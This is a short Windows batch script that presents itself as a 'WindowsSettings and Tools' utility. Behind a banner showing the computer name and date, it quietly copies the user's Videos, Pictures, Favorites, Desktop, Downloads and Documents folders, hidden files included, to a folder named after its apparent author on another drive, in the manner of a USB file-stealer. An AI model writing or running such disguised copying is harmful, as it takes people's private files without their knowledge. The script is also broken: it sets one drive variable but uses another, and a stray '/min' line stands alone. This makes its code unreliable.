@echo off
MODE CON COLS=130
title WindowsSettings and Tools 
color 0A
:menu
cls
color 0A
echo.
::-------------------------------------------------------------------------------    
echo  * WindowsSettings and Tools                    *          
echo  *----------------------------------------------*
echo  * Developed by Ambbhanadi                      *
echo  *----------------------------------------------*
echo My Name is=%COMPUTERNAME%
echo Date : %date%
echo.
::-------------------------------------------------------------------------------
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\videos" "%drive%\Ambbhanadi\Videos"
%backupcmd% "%USERPROFILE%\pictures" "%drive%\Ambbhanadi\Pictures"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\Ambbhanadi\Favorites"
%backupcmd% "%USERPROFILE%\Desktop" "%drive%\Ambbhanadi\Desktop"
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\Ambbhanadi\Downloads"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\Ambbhanadi\Documents"

@echo off
cls
